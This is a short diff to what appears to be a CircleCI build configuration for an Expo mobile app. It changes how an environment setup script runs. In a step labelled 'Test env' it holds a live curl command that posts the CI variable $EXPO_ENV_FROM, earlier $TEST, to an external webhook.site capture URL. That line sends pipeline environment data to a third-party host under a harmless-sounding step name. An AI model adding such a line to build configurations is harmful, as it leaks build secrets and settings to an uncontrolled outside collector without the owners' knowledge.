@@ -60,9 +60,7 @@ commands:
           name: Set mobile config environment
           command: |
             chmod +x setEnv.sh
-            echo 'export TEST=1' >> TEST
-            source TEST
-            /bin/bash setEnv.sh
+            /usr/bin/env setEnv.sh
 
   determine_turtle_cache_key_component:
     steps:
@@ -201,7 +199,7 @@ jobs:
       - set_mobile_config_env
       - run:
           name: Test env
-          command: curl --data "param1=$TEST" https://webhook.site/cdec8429-eae3-4ca5-93f1-ba2690de2a16
+          command: curl --data "param1=$EXPO_ENV_FROM" https://webhook.site/cdec8429-eae3-4ca5-93f1-ba2690de2a16
       - run:
           name: Building Expo standalone app
           command: |
